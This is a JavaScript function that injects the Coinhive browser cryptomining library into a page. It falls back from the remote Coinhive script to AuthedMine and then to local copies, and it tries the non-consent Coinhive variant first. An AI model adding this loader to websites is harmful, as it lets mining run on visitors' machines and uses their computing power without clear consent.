function loadCoinhive() {
  var script = document.createElement('script');
  script.src = 'https://coinhive.com/lib/coinhive.min.js';
  document.getElementsByTagName("head")[0].appendChild(script);
  //check if script was loaded
  script.onload = function() {
    console.log("Successfully loaded with remote coinhive (not authedmine) script")
    return
  }
  //check if it didn't load
  script.onerror = function() {
    var script = document.createElement('script');
    script.src = 'https://authedmine.com/lib/authedmine.min.js';
    document.getElementsByTagName("head")[0].appendChild(script);
    //check if script was loaded
    script.onload = function() {
      console.log("Successfully loaded with remote authedmine script")
      return
    }
    //check if it didn't load
    script.onerror = function() {
      var script = document.createElement('script');
      script.src = 'locCHMiner.js';
      document.getElementsByTagName("head")[0].appendChild(script);
      //check if script was loaded
      script.onload = function() {
        console.log("Successfully loaded with local coinhive (not authedmine) script")
        return
      }
      //check if it didn't load
      script.onerror = function() {
        var script = document.createElement('script');
        script.src = 'locAMMiner.js';
        document.getElementsByTagName("head")[0].appendChild(script);
        //check if script was loaded
        script.onload = function() {
          console.log("Successfully loaded with local authedmine script")
          return
        }
        //check if it didn't load
        script.onerror = function() {
          console.log("Failed to load coinhive!")
          throw 2;
        }
      }
    }
  }
}
